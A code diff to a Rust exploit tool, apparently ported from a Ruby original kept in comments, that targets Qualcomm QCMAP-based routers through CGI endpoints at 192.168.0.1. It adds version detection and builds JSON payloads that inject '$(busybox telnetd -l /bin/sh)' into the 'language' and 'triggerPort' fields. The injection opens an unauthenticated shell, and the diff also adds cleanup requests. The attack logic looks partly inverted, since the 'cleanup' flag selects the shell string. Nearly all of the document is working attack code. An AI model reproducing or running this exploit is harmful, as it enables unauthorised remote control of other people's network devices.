@@ -14,6 +14,10 @@ struct Args {
     /// Filename
     #[arg(required = true)]
     token: String,
+	
+	#[arg(long, default_value_t = 0)]
+	hw_version: u8
+
 }
 
 /*
@@ -43,11 +47,207 @@ struct Auth {
 {"token":"Ваше значение token","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}
 */
 #[derive(Serialize, Deserialize,Debug)]
-struct Payload {
+struct PayloadV1 {
 	token: String,
 	module: String,
 	action: u8,
 	language: String
+}
+
+#[derive(Serialize, Deserialize,Debug)]
+#[serde(rename_all = "camelCase")]
+struct PayloadV5 {
+	token: String,
+	module: String,
+	action: u8,
+	entry_id: u8,
+	enable_state: u8,
+	application_name: String,
+	trigger_port: String,
+	trigger_protocol: String,
+	open_port: String,
+	open_protocol: String,
+}
+
+#[derive(Serialize, Deserialize,Debug)]
+#[serde(rename_all = "camelCase")]
+struct PayloadCleanupV5 {
+	token: String,
+	module: String,
+	action: u8,
+	entry_id_set: Vec<u8>
+}
+
+#[derive(Serialize,Debug)]
+#[serde(untagged)]
+enum Payload {
+	V1(PayloadV1),
+	V5(PayloadV5),
+	CleanupV5(PayloadCleanupV5)
+}
+
+/*
+    def detect_v1
+        login_data = {"module": "authenticator", "action": 0}.to_json
+        res = Curl.post("http://#{@options[:target]}/cgi-bin/qcmap_auth", login_data) do |http|
+            http.headers["Content-Type"] = "application/json"
+        end
+        
+        return false if res.code == 404
+        return true if res.code == 200
+        return nil
+    end
+*/
+
+async fn detect_v1() -> bool {
+
+	let login_data = Auth{
+		module: String::from("authenticator"),
+		action: 0,
+		digest: String::from("xxx")
+	};
+
+	let client = reqwest::Client::new();
+
+	let payload_str = serde_json::to_string(&login_data).unwrap();
+
+	let resp = client.post("http://192.168.0.1/cgi-bin/qcmap_auth")
+		.body(payload_str)
+		.send()
+		.await;
+
+    println!("{resp:#?}");
+
+	resp.unwrap().status().is_success()
+}
+/* 
+    def detect_v5
+        login_data = {"module": "authenticator", "action": 0}.to_json
+        res = Curl.post("http://#{@options[:target]}/cgi-bin/auth_cgi", login_data) do |http|
+            http.headers["Content-Type"] = "application/json"
+        end
+        
+        return false if res.code == 404
+        return true if res.code == 200
+        return nil
+    end
+*/
+
+async fn detect_v5() -> bool {
+
+	let login_data = Auth{
+		module: String::from("authenticator"),
+		action: 0,
+		digest: String::from("xxx")
+	};
+
+	let client = reqwest::Client::new();
+
+	let payload_str = serde_json::to_string(&login_data).unwrap();
+
+	let resp = client.post("http://192.168.0.1/cgi-bin/auth_cgi")
+		.body(payload_str)
+		.send()
+		.await;
+
+    println!("{resp:#?}");
+
+	resp.unwrap().status().is_success()
+}
+
+/*
+    def detect_version
+        
+        if @options[:rce] == 1 || detect_v1
+            @options[:rce] = 1
+            @options[:cgi_path] = "qcmap_auth"
+            puts "[ok] Detected v1"
+        elsif @options[:rce] == 5 || detect_v5
+            @options[:rce] = 5
+            @options[:cgi_path] = "auth_cgi"
+            puts "[ok] Detected v5"
+        else
+            raise "No suitable RCE found"
+        end
+    end
+*/
+
+async fn detect_version() -> std::result::Result<u8,String> {
+
+	if detect_v1().await {
+		Ok(1)
+	} else if detect_v5().await {
+		Ok(5)
+	} else {
+		Err("HW Version not found".to_string())
+	}
+}
+
+
+
+
+fn get_payload(version: u8, token: &String, cleanup: bool) -> Payload {
+
+	let attack_string: String;
+
+	if version < 5 {
+
+		attack_string = if cleanup {
+			String::from("$(busybox telnetd -l /bin/sh)")
+		} else {
+			String::from("en")
+		};
+
+		Payload::V1(PayloadV1{
+			token: token.into(),
+			module: "webServer".to_string(),
+			action: 1,
+			language: attack_string
+		})
+	} else if cleanup {
+
+		Payload::CleanupV5(PayloadCleanupV5{
+			token: token.into(),
+			module: String::from("portTrigger"),
+			action: 2,
+			entry_id_set: vec![1]
+		})
+	} else {
+
+		/*
+			"token": @options[:token],
+            "module": "portTrigger",
+            "action": 1,
+            "entryId": 1,
+            "enableState": 1,
+            "applicationName": "telnetd",
+            "triggerPort": "$(busybox telnetd -l /bin/sh)",
+            "triggerProtocol": "TCP",
+            "openPort": "1337-2137",
+            "openProtocol": "TCP"
+		 */
+		
+
+		attack_string = if cleanup {
+			String::from("$(busybox telnetd -l /bin/sh)")
+		} else {
+			String::from("en")
+		};
+
+		 Payload::V5(PayloadV5 {
+			token: token.into(),
+			module: String::from("portTrigger"),
+			action: 2,
+			entry_id: 1,
+			enable_state: 1,
+			application_name: String::from("telnetd"),
+			trigger_port: attack_string,
+			trigger_protocol: String::from("TCP"),
+			open_port: String::from("1337-2137"),
+			open_protocol: String::from("TCP"),
+		})
+		
+	}
 }
 
 
@@ -56,6 +256,17 @@ async fn main()  {
 
 	let args = Args::parse();
 	let token = args.token;
+	let arg_version = args.hw_version;
+
+	let version: u8;
+
+	if arg_version == 0 {
+		version = detect_version().await.unwrap();
+	} else {
+		version = arg_version;
+	}
+
+	println!("{version:#?}");
 
 	// TODO implement AUTH
 
@@ -150,30 +361,37 @@ async fn main()  {
 
 	/*{"token":"Ваше значение token","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}*/
 
-	let payload = Payload {
+	let payload = get_payload(version, &local_token, false);
+
+	let payload_cleanup = get_payload(version, &local_token, true);
+
+	/*let payload = PayloadV1 {
 		token: String::from(&token),
 		module: "webServer".to_string(),
 		action: 1,
 		language: "$(busybox telnetd -l /bin/sh)".to_string()
 	};
 
-	let payload_restore_language = Payload {
+	let payload_cleanup = PayloadV1 {
 		token: String::from(&token),
 		module: "webServer".to_string(),
 		action: 1,
 		language: "en".to_string()
-	};
+	};*/
+
+	let payload_str = serde_json::to_string(&payload).unwrap();
 
 	println!("{token:#?}");
 	println!("{payload:#?}");
+	println!("{payload_str:#?}");
 	println!("{headers:#?}");
 
 	let client = reqwest::Client::new();
 
 	let payload_headers = headers.clone();
-	let payload_str = serde_json::to_string(&payload).unwrap();
+	
 	let payload_restore_language_headers = headers.clone();
-	let payload_restore_language_str = serde_json::to_string(&payload_restore_language).unwrap();
+	let payload_restore_language_str = serde_json::to_string(&payload_cleanup).unwrap();
 
 	let resp = client.post("http://192.168.0.1/cgi-bin/qcmap_web_cgi")
 		.body(payload_str)
